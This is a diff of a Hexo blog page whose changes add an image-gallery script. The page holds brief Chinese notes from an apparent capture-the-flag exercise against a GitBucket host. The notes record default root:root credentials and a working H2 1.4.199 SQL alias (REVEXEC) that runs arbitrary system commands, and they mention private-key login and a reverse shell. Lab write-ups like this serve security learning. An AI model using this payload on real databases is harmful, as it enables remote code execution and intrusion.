@@ -74,6 +74,8 @@
     
 	<!-- mathjax -->
 	
+  
+  
 <meta name="generator" content="Hexo 7.3.0"></head>
 
 <body class="max-width mx-auto px3 ltr">
@@ -187,22 +189,27 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <ol>
-<li>root:root<br><img src="/../assets/img/%7BB831FCD2-CB24-47A2-A74B-BEE516299CDC%7D.png" alt="alt text"></li>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><ol>
+<li>root:root<br><a href="/../assets/img/%7BB831FCD2-CB24-47A2-A74B-BEE516299CDC%7D.png" title="alt text" class="gallery-item"><img src="/../assets/img/%7BB831FCD2-CB24-47A2-A74B-BEE516299CDC%7D.png" alt="alt text"></a></li>
 </ol>
 <p><a target="_blank" rel="noopener" href="http://10.10.11.33:8080/admin/dbviewer">http://10.10.11.33:8080/admin/dbviewer</a></p>
 <p>考虑到 GitBucket 是一个 java Web 应用程序，从 cookie 中：JSESSIONID，我们想到了 H2，它是一个用 Java 编写的关系数据库管理系统（我们可以通过运行不正确的查询来确认这一点），我们使用查找版本，它是 1.4.199。在谷歌上搜索，我们发现了这篇关于链接 RCE 的 H2 数据库中的漏洞的 Medium 帖子。SELECT H2VERSION() FROM DUALH2 java 1.4.199 exploit</p>
 <p>所以基本上，H2 容易受到 RCE 的攻击，我们可以执行任意命令。我们首先创建一个名为 REVEXEC 的别名，这将允许我们稍后运行 shell 命令和执行代码。</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS REVEXEC <span class="keyword">AS</span> $$ String shellexec(String cmd) throws java.io.IOException &#123;</span><br><span class="line">    java.util.Scanner s <span class="operator">=</span> <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().<span class="keyword">exec</span>(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">    <span class="keyword">return</span> s.hasNext() ? s.next() : &quot;&quot;; </span><br><span class="line">&#125;$$;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/../assets/img/%7BCB7890AC-9968-4B06-BC49-085D9DC6C814%7D.png" alt="alt text"></p>
+<p><a href="/../assets/img/%7BCB7890AC-9968-4B06-BC49-085D9DC6C814%7D.png" title="alt text" class="gallery-item"><img src="/../assets/img/%7BCB7890AC-9968-4B06-BC49-085D9DC6C814%7D.png" alt="alt text"></a></p>
 <p>执行后，我们现在可以调用我们的别名来执行命令。</p>
-<p><img src="/../assets/img/%7B9BF84C05-6926-491B-9D46-F08668B09AD7%7D.png" alt="alt text"></p>
-<p><img src="/../assets/img/%7BFB6DC057-1964-4F82-B362-CE0D31E22E67%7D.png" alt="alt text"></p>
-<p>公钥私钥？<br>利用私钥登录？<br><img src="/../assets/img/%7BC79FD5D5-5C46-4C55-B26D-DE8C62B932BC%7D.png" alt="alt text"></p>
-<p><img src="/../assets/img/%7BB77018B7-C1FA-4031-8F76-6136A6BE1F45%7D.png" alt="alt text"><br><img src="/../assets/img/%7B789671E9-4632-4454-A382-D41C38D76855%7D.png" alt="alt text"></p>
+<p><a href="/../assets/img/%7B9BF84C05-6926-491B-9D46-F08668B09AD7%7D.png" title="alt text" class="gallery-item"><img src="/../assets/img/%7B9BF84C05-6926-491B-9D46-F08668B09AD7%7D.png" alt="alt text"></a></p>
+<p><a href="/../assets/img/%7BFB6DC057-1964-4F82-B362-CE0D31E22E67%7D.png" title="alt text" class="gallery-item"><img src="/../assets/img/%7BFB6DC057-1964-4F82-B362-CE0D31E22E67%7D.png" alt="alt text"></a></p>
+<p>公钥私钥？<br>利用私钥登录？<br><a href="/../assets/img/%7BC79FD5D5-5C46-4C55-B26D-DE8C62B932BC%7D.png" title="alt text" class="gallery-item"><img src="/../assets/img/%7BC79FD5D5-5C46-4C55-B26D-DE8C62B932BC%7D.png" alt="alt text"></a></p>
+<p><a href="/../assets/img/%7BB77018B7-C1FA-4031-8F76-6136A6BE1F45%7D.png" title="alt text" class="gallery-item"><img src="/../assets/img/%7BB77018B7-C1FA-4031-8F76-6136A6BE1F45%7D.png" alt="alt text"></a><br><a href="/../assets/img/%7B789671E9-4632-4454-A382-D41C38D76855%7D.png" title="alt text" class="gallery-item"><img src="/../assets/img/%7B789671E9-4632-4454-A382-D41C38D76855%7D.png" alt="alt text"></a></p>
 <p>为啥？<br>反弹shell？</p>
-
+</div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
   </div>
 </article>
 
@@ -372,6 +379,10 @@
           (document.getElementById('utterances_thread')).appendChild(script);
       }());
   </script>
+
+
+
+<!-- FancyBox -->
 
 </body>
 </html>
